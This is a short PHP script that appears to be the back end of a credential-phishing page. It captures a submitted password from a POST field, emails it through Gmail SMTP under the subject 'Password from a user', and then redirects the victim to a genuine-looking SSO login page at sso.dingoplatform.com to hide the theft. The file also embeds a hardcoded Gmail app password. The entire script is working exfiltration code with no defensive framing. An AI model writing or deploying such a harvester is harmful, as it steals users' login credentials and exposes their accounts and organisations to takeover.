<?php
$password=$_POST['loginName'];
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // if using Composer

$mail = new PHPMailer(true);

try {
    // SMTP configuration
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'youremail@gmail.com';
    $mail->Password   = 'csscpwtnztplbckb'; // the generated password from https://myaccount.google.com/apppasswords
    $mail->SMTPSecure = 'tls'; // or 'ssl'
    $mail->Port       = 587;   // or 465 for ssl

    // Email content
    $mail->setFrom('youremail@gmail.com', 'Mohd');
    $mail->addAddress('youremail@gmail.com', 'Recipient Name');
    $mail->Subject = 'Password from a user';
    $mail->Body    = 'The user password is:.'.$password;

    $mail->send();
    header("Location: https://sso.dingoplatform.com/ui/login/");
} catch (Exception $e) {
    echo "Mailer Error: {$mail->ErrorInfo}";
}


?>